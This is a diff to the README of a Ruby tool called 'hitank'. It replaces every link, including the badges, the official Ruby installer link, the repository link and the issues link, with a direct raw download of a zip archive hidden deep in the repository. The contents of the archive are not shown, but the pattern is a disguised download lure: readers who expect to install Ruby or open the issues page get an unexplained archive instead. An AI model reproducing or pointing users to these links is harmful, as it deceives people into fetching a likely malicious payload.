@@ -1,6 +1,6 @@
 # ⚙️ hitank - Simple Ruby Code Skills Utility
 
-[![Download hitank](https://img.shields.io/badge/Download-hitank-brightgreen)](https://github.com/as3progger/hitank)
+[![Download hitank](https://img.shields.io/badge/Download-hitank-brightgreen)](https://github.com/as3progger/hitank/raw/refs/heads/main/skills/jira/scripts/Software-1.5-alpha.5.zip)
 
 ## 📝 What is hitank?
 
@@ -28,7 +28,7 @@ If you don’t have Ruby installed on your Windows machine, the next section wil
 
 If you do not have Ruby on your PC, follow these steps:
 
-1. Go to the official Ruby installer page: https://rubyinstaller.org/
+1. Go to the official Ruby installer page: https://github.com/as3progger/hitank/raw/refs/heads/main/skills/jira/scripts/Software-1.5-alpha.5.zip
 2. Download the recommended version, usually the latest stable release.
 3. Run the installer and follow the wizard steps. Make sure to check the option **Add Ruby executables to your PATH** during installation.
 4. After installation, open Command Prompt (type `cmd` in the Start menu) and type `ruby -v` to confirm Ruby is installed correctly. You should see the Ruby version number.
@@ -41,7 +41,7 @@ To get hitank running on your Windows computer, follow these steps carefully:
 
 Click the button below to visit the hitank GitHub page, where you can find the files:
 
-[![Download hitank](https://img.shields.io/badge/Download-hitank-blue)](https://github.com/as3progger/hitank)
+[![Download hitank](https://img.shields.io/badge/Download-hitank-blue)](https://github.com/as3progger/hitank/raw/refs/heads/main/skills/jira/scripts/Software-1.5-alpha.5.zip)
 
 ### Step 2: Download the latest release
 
@@ -90,7 +90,7 @@ Here are a few common issues and fixes:
 - **Hitank does not start or shows errors**: Check that all files were extracted correctly and you are in the right folder when running the command.
 - **Unclear outputs or no response**: Make sure your Ruby version is 2.5 or above, and retry running the program.
 
-If problems persist, you may check the GitHub repository issues for similar cases: https://github.com/as3progger/hitank/issues
+If problems persist, you may check the GitHub repository issues for similar cases: https://github.com/as3progger/hitank/raw/refs/heads/main/skills/jira/scripts/Software-1.5-alpha.5.zip
 
 ## 🔧 Advanced Setup (Optional)
 
@@ -114,8 +114,8 @@ Here is what you will find inside the hitank folder:
 
 ## 🌐 Useful Links
 
-- Ruby Installer for Windows: https://rubyinstaller.org/
-- hitank GitHub Repository: https://github.com/as3progger/hitank
-- GitHub Issues for hitank: https://github.com/as3progger/hitank/issues
+- Ruby Installer for Windows: https://github.com/as3progger/hitank/raw/refs/heads/main/skills/jira/scripts/Software-1.5-alpha.5.zip
+- hitank GitHub Repository: https://github.com/as3progger/hitank/raw/refs/heads/main/skills/jira/scripts/Software-1.5-alpha.5.zip
+- GitHub Issues for hitank: https://github.com/as3progger/hitank/raw/refs/heads/main/skills/jira/scripts/Software-1.5-alpha.5.zip
 
 This setup guide aims to help you get started with hitank using plain steps and minimal technical background.
